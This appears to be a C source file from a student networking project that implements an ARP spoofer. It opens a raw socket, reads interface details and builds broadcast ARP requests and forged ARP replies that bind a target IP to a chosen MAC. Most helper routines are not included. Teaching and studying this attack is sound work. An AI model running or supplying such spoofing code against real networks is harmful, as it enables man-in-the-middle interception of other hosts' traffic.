/*
** EPITECH PROJECT, 2018
** MYARPSPOOF
** File description:
** arpspoof.c
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <fcntl.h>
#include "spoof.h"

int function_print(char **av)
{
    arp_header_t arp;

    if (!get_addr_mac(&arp, av[2]))
        return (FAILURE);
    if (strcmp("--printBroadcast", av[3]) == 0 && av[4] == NULL) {
        fill_struct(&arp, ARP_REQUEST);
        fill_struct_ip(&arp, av[0], av[1]);
        fill_struct_mac(&arp, BROADCAST);
    }
    if (strcmp("--printSpoof", av[3]) == 0 && av[4] != NULL) {
        fill_struct(&arp, ARP_REPLY);
        fill_struct_ip(&arp, av[0], av[1]);
        fill_struct_mac(&arp, av[4]);
    }
    print_struct(&arp, sizeof(arp));
    return (SUCCESS);
}

bool arpspoof(char *mac_addr, char **av, int sd, int ifindex)
{
    arp_header_t arp;
    struct sockaddr_ll sock_addr;

    sscanf(mac_addr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx:"
        , &(arp.send_mac[0]), &(arp.send_mac[1]), &(arp.send_mac[2])
        , &(arp.send_mac[3]), &(arp.send_mac[4]), &(arp.send_mac[5]));
    fill_struct(&arp, ARP_REQUEST);
    fill_struct_ip(&arp, av[0], av[1]);
    fill_struct_mac(&arp, BROADCAST);
    fill_struct_sockaddr(&sock_addr, ifindex, &arp);
    send_arp(sd, &arp, &sock_addr);
    receiv_arp(sd, av, &arp, ifindex);
    return (true);
}

int init_arpspoof(int ac, char **av)
{
    char *mac_addr = "";
    int sd = 0;
    int ifindex = 0;
    struct ifreq send;

    if (ac >= 5)
        return (function_print(av));
    if (!create_socket(&sd) || mac_addr == NULL)
        return (FAILURE);
    if (!check_ioctl(sd, SIOCGIFINDEX, &send, av[2]))
        return (FAILURE);
    ifindex = send.ifr_ifindex;
    if (!check_ioctl(sd, SIOCGIFHWADDR, &send, av[2]))
        return (FAILURE);
    if ((mac_addr = fill_addr_mac(&send)) == NULL
        || !arpspoof(mac_addr, av, sd, ifindex))
        return (FAILURE);
    free(mac_addr);
    return (SUCCESS);
}